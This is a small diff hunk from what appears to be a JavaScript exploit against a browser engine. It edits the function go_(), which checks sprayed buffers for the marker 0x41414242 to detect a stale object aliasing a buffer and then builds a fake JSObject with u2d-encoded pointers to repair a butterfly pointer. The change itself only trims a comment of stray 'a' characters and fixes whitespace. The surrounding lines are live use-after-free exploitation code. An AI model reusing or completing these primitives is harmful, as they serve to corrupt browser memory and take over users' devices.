@@ -170,10 +170,9 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
-				// Create fakeobj for fixing butterfly ptraaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+				// Create fakeobj for fixing butterfly ptr
 
-
- 				
+ 			
 
 				stale[0] = {
 					'a': u2d(105, 0x1172600), // the JSObject properties
